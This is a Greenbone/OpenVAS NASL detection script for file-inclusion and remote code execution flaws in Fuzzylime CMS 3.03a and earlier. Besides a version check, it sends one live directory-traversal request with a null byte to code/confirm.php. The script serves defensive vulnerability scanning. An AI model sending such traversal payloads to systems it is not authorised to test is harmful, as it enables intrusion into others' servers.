# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:fuzzylime:fuzzylime_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900584");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2009-06-30 16:55:49 +0200 (Tue, 30 Jun 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2176", "CVE-2009-2177");
  script_name("Fuzyylime(cms) RCE Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_fuzzylime_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("fuzzylimecms/installed");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8978");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35418");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/51205");

  script_tag(name:"affected", value:"Fuzyylime(cms) version 3.03a and prior.");

  script_tag(name:"insight", value:"The flaws are due to:

  - The data passed into 'list' parameter in code/confirm.php and to the
  'template' parameter in code/display.php is not properly verified
  before being used to include files.

  - Input passed to the 's' parameter in code/display.php is not properly
  verified before being used to write to a file.");

  script_tag(name:"solution", value:"Upgrade to fuzzylime 3.03b or later.");

  script_tag(name:"summary", value:"Fuzyylime(cms) is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to include and execute
  arbitrary files from local and external resources, and can gain sensitive
  information about remote system directories when magic_quotes_gpc is disabled.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://cms.fuzzylime.co.uk/st/content/download");
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
  exit( 0 );

vers = infos["version"];
dir = infos["location"];

if( dir == "/" )
  dir = "";

url = dir + "/code/confirm.php?e[]&list=../../admin/index.php\0";

sndReq = http_get( item:url, port:port );
rcvRes = http_send_recv( port:port, data:sndReq );

if( "admin/index.php" >< rcvRes ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

if( ! isnull( vers ) ) {
  if( version_is_less_equal( version:vers, test_version:"3.03a" ) ) {
    report = report_fixed_ver( installed_version:vers, fixed_version:"3.03b", install_url:dir );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
